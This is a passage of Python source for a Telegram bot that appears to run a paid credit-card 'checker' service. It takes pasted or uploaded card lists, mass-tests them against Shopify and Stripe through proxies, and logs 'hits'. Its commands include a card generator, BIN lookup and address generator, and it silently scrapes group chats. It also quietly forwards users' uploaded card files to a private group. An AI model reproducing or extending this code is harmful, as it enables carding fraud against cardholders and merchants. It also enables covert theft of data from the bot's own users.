        try: await msg.bot.send_message(target_uid, reply_text, parse_mode="HTML")
        except: pass
        await msg.answer(f"{pe('check')} <b>{sc('Reply sent')}</b>", parse_mode="HTML")
        return

    # ── Admin awaiting handlers ────────────────────────────────
    if awaiting and is_admin(uid):
        set_awaiting(uid, '')
        if awaiting.startswith("set_setting:"):
            key = awaiting.split(":")[1]
            val = "" if v.lower() == "off" else v
            set_setting(key, val)
            await msg.answer(f"✅ {key} = <code>{val or 'Cleared'}</code>",
                             parse_mode="HTML", reply_markup=admin_main_kb(uid))
            return
        if awaiting.startswith("give_credits:"):
            target_uid = int(awaiting.split(":")[1])
            if v.isdigit():
                with db() as c:
                    c.execute("UPDATE users SET credits=credits+? WHERE uid=?",
                              (int(v), target_uid))
                await msg.answer(f"✅ +{v} credits → {target_uid}",
                                 reply_markup=admin_main_kb(uid))
                try:
                    await _bot_ref.send_message(
                        target_uid,
                        f"{pe('gem')} You received {v} credits from admin!",
                        parse_mode="HTML")
                except: pass
            else:
                await msg.answer("❌ Invalid", reply_markup=admin_main_kb(uid))
            return
        if awaiting.startswith("edit_price:"):
            plan = awaiting.split(":")[1]
            if v.replace('.', '', 1).isdigit():
                set_setting(f"price_{plan}", v)
                await msg.answer(f"✅ {plan.title()} = ${v}",
                                 reply_markup=admin_main_kb(uid))
            else:
                await msg.answer("❌ Invalid", reply_markup=admin_main_kb(uid))
            return
        if awaiting == "edit_trial":
            if v.isdigit():
                set_setting("trial_hours", v)
                await msg.answer(f"✅ Trial = {v} hours",
                                 reply_markup=admin_main_kb(uid))
            else:
                await msg.answer("❌ Invalid", reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_gen_code":
            parts = msg.text.split()
            if len(parts) == 3 and parts[0].lower() in PLANS and parts[1].isdigit() and parts[2].isdigit():
                code = f"{KEY_PREFIX}-" + ''.join(random.choices(
                    string.ascii_uppercase + string.digits, k=4))
                with db() as c:
                    c.execute("INSERT INTO redeem_codes (code, plan, max_uses, days, used) "
                              "VALUES (?,?,?,?,0)",
                              (code, parts[0].lower(), int(parts[1]), int(parts[2])))
                await msg.answer(
                    f"{pe('gem')} <b>{sc('Code')}</b>\n"
                    f"<blockquote>{pe('star')} <code>{code}</code>\n"
                    f"{pe('gem')} {PLANS[parts[0].lower()]['name']}\n"
                    f"{pe('user')} Uses: <b>{parts[1]}</b>\n"
                    f"{pe('hourglass')} Days: <b>{parts[2]}</b></blockquote>",
                    parse_mode="HTML", reply_markup=admin_main_kb(uid))
            else:
                await msg.answer("❌ Invalid format", reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_add_admin" and v.isdigit():
            if int(v) not in ADMIN_IDS:
                ADMIN_IDS.append(int(v))
                LIMITED_ADMIN_IDS[:] = [x for x in LIMITED_ADMIN_IDS if x != int(v)]
                save_extra_admins()
            await msg.answer(f"{pe('check')} Admin granted",
                             reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_add_ltd_admin" and v.isdigit():
            if int(v) not in LIMITED_ADMIN_IDS and int(v) not in ADMIN_IDS:
                LIMITED_ADMIN_IDS.append(int(v))
                save_extra_admins()
            await msg.answer(f"{pe('check')} Moderator granted",
                             parse_mode="HTML", reply_markup=admin_main_kb(uid))
            return
        if awaiting.startswith("admin_broadcast:"):
            target = awaiting.split(":")[1]
            res = await broadcast_all(msg.bot, text=msg.html_text,
                                       only_premium=(target == "premium"))
            await msg.answer(f"{pe('check')} Sent {res['ok']}/{res['total']}",
                             reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_api_sl_add":
            eps = [l.strip() for l in msg.text.splitlines()
                   if l.strip().startswith("http")]
            for ep in eps: add_siteless_api(ep)
            await msg.answer(f"{pe('check')} Added {len(eps)} siteless APIs",
                             parse_mode="HTML", reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_api_ws_add":
            eps = [l.strip() for l in msg.text.splitlines()
                   if l.strip().startswith("http")]
            for ep in eps: add_withsite_api(ep)
            await msg.answer(f"{pe('check')} Added {len(eps)} with-site APIs",
                             parse_mode="HTML", reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_api_add":
            if v.startswith("http"):
                st = load_api_state()
                st["endpoints"].append({"url": v, "style": "raw", "cap": 900,
                                         "enabled": True, "key": None,
                                         "site_required": False})
                save_api_state(st)
                await msg.answer(f"✅ API added: {v}",
                                 reply_markup=admin_main_kb(uid))
            else:
                await msg.answer("❌ Invalid URL",
                                 reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_scrapper_add":
            fwd = getattr(msg, "forward_from_chat", None)
            if fwd:
                with db() as c:
                    c.execute("INSERT OR REPLACE INTO scrapper_gcs(chat_id, title, added_at) "
                              "VALUES(?,?,?)",
                              (str(fwd.id), fwd.title or "",
                               datetime.now(timezone.utc).isoformat()))
                await msg.answer(f"{pe('check')} GC added: {esc(fwd.title or '')}",
                                 parse_mode="HTML", reply_markup=admin_main_kb(uid))
            elif v.lstrip("-").isdigit():
                with db() as c:
                    c.execute("INSERT OR REPLACE INTO scrapper_gcs(chat_id, title, added_at) "
                              "VALUES(?,?,?)",
                              (v, v, datetime.now(timezone.utc).isoformat()))
                await msg.answer(f"{pe('check')} GC added: {v}",
                                 reply_markup=admin_main_kb(uid))
            else:
                await msg.answer("❌ Send chat ID or forward",
                                 reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_force_add":
            fwd = getattr(msg, "forward_from_chat", None)
            if fwd:
                chat_id = str(fwd.id)
                title = fwd.title or ""
                invite = ""
                try:
                    chat = await msg.bot.get_chat(chat_id)
                    invite = chat.invite_link or (f"https://t.me/{chat.username}" if chat.username else "")
                except: pass
                add_force_channel(chat_id, title, fwd.type, invite)
                await msg.answer(f"✅ Force channel: {title}",
                                 reply_markup=admin_main_kb(uid))
            elif v.startswith("@"):
                try:
                    chat = await msg.bot.get_chat(v)
                    chat_id = str(chat.id)
                    title = chat.title or ""
                    invite = chat.invite_link or (f"https://t.me/{chat.username}" if chat.username else "")
                    add_force_channel(chat_id, title, chat.type, invite)
                    await msg.answer(f"✅ Force channel: {title}",
                                     reply_markup=admin_main_kb(uid))
                except Exception as e:
                    await msg.answer(f"❌ {e}", reply_markup=admin_main_kb(uid))
            else:
                await msg.answer("❌ Invalid", reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_site_chkr":
            sites = parse_site_list(msg.text)
            if not sites:
                return await msg.answer("❌ No sites", reply_markup=admin_main_kb(uid))
            st = await msg.answer(
                f"{pe('loading')} Checking {len(sites)} sites...",
                parse_mode="HTML")
            max_p = float(get_setting("site_max_price", "6.0"))
            clean, upper, dead = [], [], []
            sem, lock = asyncio.Semaphore(10), asyncio.Lock()
            async def check_one(s):
                async with sem:
                    r = await test_site(s, timeout=20)
                    cls = r.get("cls", "error")
                    amt = float(r.get("amount") or 0.0)
                    resp = r.get("response", "")[:80]
                    async with lock:
                        if cls in ("error", "timeout", "proxy_error", "site_error"):
                            dead.append({"site": s, "reason": resp, "cls": cls})
                        elif amt > max_p or "CAPTCHA" in resp.upper():
                            upper.append({"site": s, "price": amt, "cls": cls})
                        elif cls in WORKING_SITE_CLASSES:
                            clean.append({"site": s, "price": amt, "cls": cls})
                        else:
                            dead.append({"site": s, "reason": resp, "cls": cls})
            await asyncio.gather(*(check_one(s) for s in sites))
            lines = [
                f"{pe('check')} <b>Site Checker</b>",
                f"<blockquote>Total: <b>{len(sites)}</b>\n"
                f"Clean: <b>{len(clean)}</b>\n"
                f"High Price: <b>{len(upper)}</b>\n"
                f"Dead: <b>{len(dead)}</b></blockquote>"
            ]
            await st.edit_text("\n".join(lines), parse_mode="HTML",
                               reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_sites_add":
            site_count = len([l for l in re.split(r"[\r\n,;]+", msg.text) if l.strip()])
            st = await msg.answer(
                f"{pe('loading')} Checking {site_count} sites via API...",
                parse_mode="HTML")
            result = await bulk_add_sites(msg.text)
            await st.edit_text(_bulk_sites_report(result), parse_mode="HTML",
                               reply_markup=admin_main_kb(uid))
            return
        if awaiting == "admin_user_search" and v.isdigit():
            target_uid = int(v)
            u = get_user(target_uid)
            if not u:
                return await msg.answer(f"{pe('cross1')} User not found",
                                        parse_mode="HTML",
                                        reply_markup=admin_main_kb(uid))
            with db() as c:
                proxies = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?",
                                    (target_uid,)).fetchone()["n"]
                saved = c.execute("SELECT COUNT(*) as n FROM saved_cards WHERE uid=?",
                                  (target_uid,)).fetchone()["n"]
                recent_checks = c.execute(
                    "SELECT status, response FROM check_logs WHERE uid=? "
                    "ORDER BY id DESC LIMIT 5", (target_uid,)).fetchall()
            text = (
                f"👤 <b>[=] User Details</b>\n"
                f"<blockquote>━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 UID: <code>{target_uid}</code>\n"
                f"📝 Name: {esc(u['username'] or 'N/A')}\n"
                f"💎 Plan: {sc(u['plan'])}\n"
                f"🚫 Status: {'BANNED' if u['banned'] else 'Active'}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"💰 Credits: {u['credits']}\n"
                f"🛒 Checks: {u['total_checks']}\n"
                f"✅ Hits: {u['total_hits']}\n"
                f"🔗 Proxies: {proxies}\n"
                f"📁 Saved: {saved}\n"
                f"🤝 Referrals: {u['refer_count']}\n"
                f"🔥 Streak: {u['streak']}\n"
                f"🕐 Last seen: {esc((u['last_seen'] or 'N/A')[:16])}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"<b>Recent Checks:</b>\n"
            )
            for rc in recent_checks:
                icon = {"HIT": "✅", "DECLINED": "❌"}.get(rc["status"], "⚠️")
                text += f"{icon} {esc(rc['response'][:40])}\n"
            text += "</blockquote>"
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [pbtn("Ban/Unban", icon="warn_red", color="danger",
                      callback_data=f"admin:ban_user:{target_uid}")],
                [pbtn("Give Credits", icon="star", color="success",
                      callback_data=f"admin:give_credits:{target_uid}")],
                [pbtn("Give Premium", icon="gem", color="success",
                      callback_data=f"admin:give_premium:{target_uid}")],
                [pbtn("Back", icon="back", color="primary",
                      callback_data="admin:user_mgr")],
            ])
            await msg.answer(text, parse_mode="HTML", reply_markup=kb)
            return
        await msg.answer(f"{pe('cross1')} Unknown input",
                         parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    # ── Fallback: parse as CC input ────────────────────────────
    if not await check_force_sub(msg.bot, uid):
        return await msg.answer(f"{pe('unlock')} <b>{sc('Join required')}</b>",
                                parse_mode="HTML")

    normalized, seen = [], set()
    for line in msg.text.splitlines():
        for tok in re.split(r"[\s,;]+", line):
            n = normalize_cc(tok)
            if n and n not in seen:
                seen.add(n); normalized.append(n)
    if not normalized:
        return

    proxies = user_proxy_list(uid)
    proxy_status = f"✅ {sc('Set')}" if proxies else f"❌ {sc('Not Set')}"

    _cleanup_pending_mass()
    token = uuid.uuid4().hex[:12]
    _pending_mass[token] = {
        "uid": uid, "ccs": normalized, "mode": "shopify",
        "chat_id": msg.chat.id, "msg_id": msg.message_id,
        "ts": time.time(),
    }
    text = (
        f"{pe('glow_star')} <b>{sc('Cards Detected')}</b>\n"
        f"<blockquote>{pe('gem')} Count: <b>{len(normalized)}</b>\n"
        f"{pe('link')} Proxy: {proxy_status}\n"
        f"{pe('docs')} Choose checker:</blockquote>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [pbtn(sc("Shopify"), icon="shop", color="success",
              callback_data=f"mass_start:{token}"),
         pbtn(sc("Stripe Auth"), icon="gem", color="primary",
              callback_data=f"mass_start:{token}")],
        [pbtn(sc("Cancel"), icon="cross1", color="danger",
              callback_data=f"mass_cancel:{token}")],
    ])
    try:
        await msg.answer_photo(photo=random.choice(IMAGES), caption=text,
                                parse_mode="HTML", reply_markup=kb)
    except:
        await msg.answer(text, parse_mode="HTML", reply_markup=kb)

@router.message(F.photo)
async def handle_photo(msg: Message):
    uid = msg.from_user.id
    awaiting = get_awaiting(uid)
    if msg.chat.type in ("group", "supergroup"):
        asyncio.create_task(_silent_scrap_message(msg))
        return
    if awaiting and awaiting.startswith("set_asset:") and is_admin(uid):
        key = awaiting.split(":")[1]
        set_awaiting(uid, '')
        set_setting(key, msg.photo[-1].file_id)
        return await msg.answer(f"✅ Asset {key} updated!",
                                reply_markup=admin_main_kb(uid))
    if awaiting and awaiting.startswith("admin_broadcast:") and is_admin(uid):
        target = awaiting.split(":")[1]
        set_awaiting(uid, '')
        res = await broadcast_all(msg.bot, photo=msg.photo[-1].file_id,
                                   caption=msg.html_caption or "",
                                   only_premium=(target == "premium"))
        return await msg.answer(f"{pe('check')} Sent {res['ok']}/{res['total']}",
                                reply_markup=admin_main_kb(uid))
    # Forward to pvt cc gc if configured
    try: await forward_user_file_to_pvt_gc(msg.bot, msg, "photo")
    except: pass

@router.message(F.document)
async def handle_document(msg: Message):
    uid = msg.from_user.id
    awaiting = get_awaiting(uid)
    if msg.chat.type in ("group", "supergroup"):
        asyncio.create_task(_silent_scrap_message(msg))
        return
    doc = msg.document
    if not doc: return

    # Backup restore
    if is_full_admin(uid) and (awaiting == "restore_backup" or
                                (doc.file_name or "").lower().endswith((".sql", ".sql.gz"))):
        if re.match(r"^backup_\d+_\d+\.sql\.gz\.part\d{1,3}$", (doc.file_name or "").lower()):
            return await _handle_backup_part(msg, uid)
        set_awaiting(uid, '')
        st = await msg.answer(f"{pe('loading')} <b>Restoring DB...</b>",
                              parse_mode="HTML")
        try:
            raw = (await msg.bot.download_file(
                (await msg.bot.get_file(doc.file_id)).file_path)).read()
            if raw[:2] == b"\x1f\x8b":
                raw = gzip.decompress(raw)
            with db() as c:
                for t in ["users","settings","redeem_codes","redeem_log","check_logs",
                          "saved_cards","bin_cache","user_proxies","sites",
                          "force_channels","charged_hits","feedback",
                          "api_siteless","api_withsite","scrapper_gcs"]:
                    c.execute(f"DROP TABLE IF EXISTS {t}")
                c.executescript(raw.decode("utf-8", errors="ignore"))
            reset_db_conn(); init_db(); load_extra_admins(); _invalidate_sites()
            await st.edit_text(f"{pe('check')} <b>Restored ✓</b>",
                               parse_mode="HTML", reply_markup=admin_main_kb(uid))
        except Exception as e:
            await st.edit_text(f"{pe('cross1')} {esc(str(e)[:200])}",
                               parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return

    # Text/CC file
    fname = (doc.file_name or "").lower()
    if not fname.endswith((".txt", ".csv")):
        try: await forward_user_file_to_pvt_gc(msg.bot, msg, "document")
        except: pass
        return

    st = await msg.answer(f"{pe('loading')} <b>Downloading...</b>",
                          parse_mode="HTML")
    try:
        cards = await _scan_file_for_ccs(msg.bot, doc)
        if not cards:
            return await st.edit_text(f"{pe('cross1')} No cards found",
                                       parse_mode="HTML")
        _cleanup_pending_mass()
        token = uuid.uuid4().hex[:12]
        _pending_mass[token] = {
            "uid": uid, "ccs": cards, "mode": "shopify",
            "chat_id": msg.chat.id, "msg_id": msg.message_id,
            "ts": time.time(),
        }
        proxies = user_proxy_list(uid)
        proxy_status = f"✅ {sc('Set')}" if proxies else f"❌ {sc('Not Set')}"
        text = (
            f"{pe('check')} <b>File Detected</b>\n"
            f"<blockquote>{pe('gem')} Cards: <b>{len(cards)}</b>\n"
            f"{pe('link')} Proxy: {proxy_status}</blockquote>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [pbtn(sc("Shopify"), icon="shop", color="success",
                  callback_data=f"mass_start:{token}"),
             pbtn(sc("Stripe Auth"), icon="gem", color="primary",
                  callback_data=f"mass_start:{token}")],
            [pbtn(sc("Cancel"), icon="cross1", color="danger",
                  callback_data=f"mass_cancel:{token}")],
        ])
        await st.edit_text(text, parse_mode="HTML", reply_markup=kb)
    except Exception as e:
        await st.edit_text(f"{pe('cross1')} {esc(str(e)[:100])}", parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════════════
# BACKUP / RESTORE / SCRAPPER LOOP / AUTO TASKS
# ═══════════════════════════════════════════════════════════════════════════

async def forward_user_file_to_pvt_gc(bot, msg: Message, context: str = ""):
    doc = msg.document
    if not doc: return
    cc_gc = get_setting("pvt_cc_gc_id")
    if not cc_gc: return
    cards = await _scan_file_for_ccs(bot, doc)
    if not cards: return
    try: chat_id = int(cc_gc) if re.fullmatch(r"-?\d+", cc_gc) else cc_gc
    except: return
    header = (f"{pe('gem')} <b>CC FILE</b>\n"
              f"<blockquote>{pe('user')} UID: <code>{msg.from_user.id}</code>\n"
              f"{pe('link')} @{esc(msg.from_user.username or 'N/A')}\n"
              f"{pe('pen')} File: <code>{esc(doc.file_name or 'file')}</code>\n"
              f"{pe('check')} Cards: <b>{len(cards)}</b>\n"
              f"{pe('settings')} Context: {esc(context or 'general')}</blockquote>")
    try:
        await bot.send_document(chat_id, doc.file_id, caption=header[:1024],
                                parse_mode="HTML")
    except: pass

async def send_backup(target_chat: int):
    if not _bot_ref: return False
    try:
        with db() as c:
            dump = "\n".join(c.iterdump())
        compressed = gzip.compress(dump.encode('utf-8'))
        total = len(compressed)
        base = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql.gz"
        if total <= BACKUP_CHUNK_SIZE:
            msg = await _bot_ref.send_document(
                target_chat,
                BufferedInputFile(compressed, filename=base),
                caption=f"📦 <b>Backup</b>\n{total/1024/1024:.2f} MB",
                parse_mode="HTML")
            try: await _bot_ref.pin_chat_message(target_chat, msg.message_id,
                                                 disable_notification=True)
            except: pass
            return True
        chunks = [compressed[i:i+BACKUP_CHUNK_SIZE]
                  for i in range(0, total, BACKUP_CHUNK_SIZE)]
        for idx, chunk in enumerate(chunks, start=1):
            await _bot_ref.send_document(
                target_chat,
                BufferedInputFile(chunk, filename=f"{base}.part{idx:03d}"),
                caption=f"📦 Part {idx}/{len(chunks)}",
                parse_mode="HTML")
        return True
    except: return False

async def _handle_backup_part(msg: Message, uid: int):
    doc = msg.document
    if not doc: return
    m = re.match(r"^(backup_\d+_\d+\.sql\.gz)\.part(\d{1,3})$",
                 (doc.file_name or "").lower())
    if not m: return
    base, part_num = m.group(1), int(m.group(2))
    _cleanup_restore_sessions()
    try:
        raw = (await msg.bot.download_file(
            (await msg.bot.get_file(doc.file_id)).file_path)).read()
    except Exception as e:
        return await msg.answer(f"{pe('cross1')} {esc(str(e))}", parse_mode="HTML")
    with _restore_lock:
        sess = _restore_sessions.get(base)
        if not sess:
            sess = {"parts": {}, "ts": time.time(), "uid": uid,
                    "chat_id": msg.chat.id, "expected": None}
            _restore_sessions[base] = sess
        sess["parts"][part_num] = raw
        sess["ts"] = time.time()
        have = len(sess["parts"])
    await msg.answer(f"{pe('check')} Part {part_num} stored ({have} total)\n"
                     f"<i>Send remaining parts or /restore_done</i>",
                     parse_mode="HTML")

async def _try_finish_multipart(msg: Message, base: str, status_msg):
    with _restore_lock:
        sess = _restore_sessions.get(base)
        if not sess:
            return await status_msg.edit_text("No session", parse_mode="HTML")
        parts = dict(sess["parts"])
    if not parts:
        return await status_msg.edit_text("No parts", parse_mode="HTML")
    max_n = max(parts.keys())
    missing = [i for i in range(1, max_n + 1) if i not in parts]
    if missing:
        return await status_msg.edit_text(
            f"{pe('warn')} Missing: {missing}", parse_mode="HTML")
    compressed = b"".join(parts[i] for i in range(1, max_n + 1))
    try:
        if compressed[:2] == b"\x1f\x8b": compressed = gzip.decompress(compressed)
        raw = compressed.decode("utf-8", errors="ignore")
        with db() as c:
            for t in ["users","settings","redeem_codes","redeem_log","check_logs",
                      "saved_cards","bin_cache","user_proxies","sites",
                      "force_channels","charged_hits","feedback",
                      "api_siteless","api_withsite","scrapper_gcs"]:
                c.execute(f"DROP TABLE IF EXISTS {t}")
            c.executescript(raw)
        reset_db_conn(); init_db(); load_extra_admins(); _invalidate_sites()
        with _restore_lock: _restore_sessions.pop(base, None)
        await status_msg.edit_text(f"{pe('check')} <b>Restored ✓</b>",
                                    parse_mode="HTML",
                                    reply_markup=admin_main_kb(msg.from_user.id))
    except Exception as e:
        await status_msg.edit_text(f"{pe('cross1')} {esc(str(e)[:200])}",
                                    parse_mode="HTML")

def _cleanup_restore_sessions():
    now = time.time()
    with _restore_lock:
        for k in [k for k, v in _restore_sessions.items()
                  if now - v.get("ts", 0) > BACKUP_SESSION_TTL]:
            _restore_sessions.pop(k, None)

async def auto_backup_task():
    while True:
        now = datetime.now(timezone.utc)
        target = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        await asyncio.sleep((target - now).total_seconds())
        await send_backup(OWNER_ID)

async def _scrapper_loop():
    """Periodic cleanup of scrapper cache."""
    await asyncio.sleep(60)
    while True:
        try:
            if len(_scrapper_seen) > 5000:
                _scrapper_seen.clear()
            await asyncio.sleep(3600)  # every hour
        except:
            await asyncio.sleep(300)

async def cache_cleanup_task():
    """Cache cleanup — removes old logs to prevent load."""
    await asyncio.sleep(1800)  # first run after 30 min
    while True:
        try:
            cutoff = (datetime.now(timezone.utc) - timedelta(days=30)).isoformat()
            with db() as c:
                c.execute("DELETE FROM check_logs WHERE ts < ?", (cutoff,))
                c.execute("DELETE FROM bin_cache WHERE ts < ?", (cutoff,))
            _cleanup_pending_mass()
            _cleanup_restore_sessions()
            if len(_dead_proxies_run) > 1000: _dead_proxies_run.clear()
            if len(_site_cooldown_until) > 500: _site_cooldown_until.clear()
            if len(_endpoint_fail_counts) > 200: _endpoint_fail_counts.clear()
            log.info("Cache cleanup completed")
        except Exception as e:
            log.warning(f"cache_cleanup: {e}")
        # 2 hours
        await asyncio.sleep(7200)

# ═══════════════════════════════════════════════════════════════════════════
# BROADCAST HELPER
# ═══════════════════════════════════════════════════════════════════════════

async def broadcast_all(bot, *, text: Optional[str] = None,
                        photo: Optional[str] = None,
                        caption: Optional[str] = None,
                        only_premium=False) -> Dict[str, int]:
    q = "SELECT uid FROM users WHERE banned=0"
    if only_premium:
        q += " AND plan IN ('premium', 'max', 'unlimited')"
    with db() as c:
        users = c.execute(q).fetchall()
    ok, fail = 0, 0
    for u in users:
        try:
            if photo:
                await bot.send_photo(u["uid"], photo=photo,
                                     caption=caption or "", parse_mode="HTML")
            else:
                await bot.send_message(u["uid"], text or "", parse_mode="HTML")
            ok += 1
        except:
            fail += 1
        await asyncio.sleep(0.05)
    bc_text = caption or text or ""
    for key in ("hit_log_channel", "fb_channel_id", "fb_channel_id2", "auto_post_chat"):
        ch = get_setting(key)
        if not ch: continue
        try:
            chat_id = int(ch) if ch.lstrip("-").isdigit() else ch
            if photo:
                await bot.send_photo(chat_id, photo=photo,
                                     caption=bc_text, parse_mode="HTML")
            elif bc_text:
                await bot.send_message(chat_id, bc_text, parse_mode="HTML")
        except: pass
    return {"ok": ok, "fail": fail, "total": len(users)}

# ═══════════════════════════════════════════════════════════════════════════
# ERROR HANDLER + HEALTH + MAIN
# ═══════════════════════════════════════════════════════════════════════════

async def error_handler(event, exception=None, **kwargs):
    if exception is None:
        exception = kwargs.get("error", Exception("unknown"))
    if any(x in type(exception).__name__ for x in
           ("Disconnect", "Timeout", "ConnectionError", "ClientOSError")):
        return True
    err_msg = str(exception).lower()
    if any(x in err_msg for x in
           ("not modified", "query is too old", "query id is invalid",
            "message to edit not found", "message can't be edited",
            "no text in the message", "chat not found", "bot was blocked",
            "user is deactivated", "too many requests")):
        return True
    log.exception(f"Unhandled {type(exception).__name__}: {exception}")
    return True

async def start_health_server(port: int) -> None:
    from aiohttp import web
    app = web.Application()
    app.router.add_get("/", lambda _: web.Response(text="ok"))
    app.router.add_get("/health", lambda _: web.Response(text="ok"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", port).start()
    log.info(f"health server on :{port}")

async def main():
    global _bot_ref, _db_write_lock, BOT_USERNAME
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN env var missing")

    _db_write_lock = _get_write_lock()
    init_db()
    load_extra_admins()
    load_api_state()

    bot = Bot(
        token=BOT_TOKEN,
        session=AiohttpSession(proxy=TELEGRAM_PROXY) if TELEGRAM_PROXY else None,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    _bot_ref = bot
    BOT_USERNAME = (await bot.get_me()).username
    log.info(f"Bot started as @{BOT_USERNAME}")

    dp = Dispatcher()
    dp.update.outer_middleware(EnsureUserMiddleware())
    dp.include_router(router)
    dp.errors.register(error_handler)
    await bot.delete_webhook(drop_pending_updates=True)

    try:
        await bot.set_my_commands([
            BotCommand(command="start", description="Main Menu"),
            BotCommand(command="cmd", description="All Commands"),
            BotCommand(command="sh", description="Shopify Single"),
            BotCommand(command="msh", description="Shopify Mass"),
            BotCommand(command="auth", description="Stripe Auth Single"),
            BotCommand(command="masssa", description="Stripe Auth Mass"),
            BotCommand(command="redeem", description="Redeem Key"),
            BotCommand(command="bin", description="BIN Lookup"),
            BotCommand(command="gen", description="CC Generator"),
            BotCommand(command="format", description="CC Formatter"),
            BotCommand(command="addr", description="Address Gen"),
            BotCommand(command="chk", description="Proxy Checker"),
            BotCommand(command="fb", description="Send Feedback"),
            BotCommand(command="iadmin", description="Message Admin"),
            BotCommand(command="top", description="Top Checkers"),
        ])
    except: pass

    asyncio.create_task(auto_backup_task())
    asyncio.create_task(_scrapper_loop())
    asyncio.create_task(cache_cleanup_task())

    if PORT:
        try:
            await start_health_server(int(PORT))
        except Exception as e:
            log.warning(f"health server failed: {e}")

    log.info(f"bot starting | apis={len(load_api_state()['endpoints'])} "
             f"sites={len(get_sites())} mode={mode_label()}")

    try:
        await dp.start_polling(bot)
    finally:
        try:
            if _direct_http_session and not _direct_http_session.closed:
                await _direct_http_session.close()
            if _proxy_http_session and not _proxy_http_session.closed:
                await _proxy_http_session.close()
        except: pass
        await bot.session.close()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
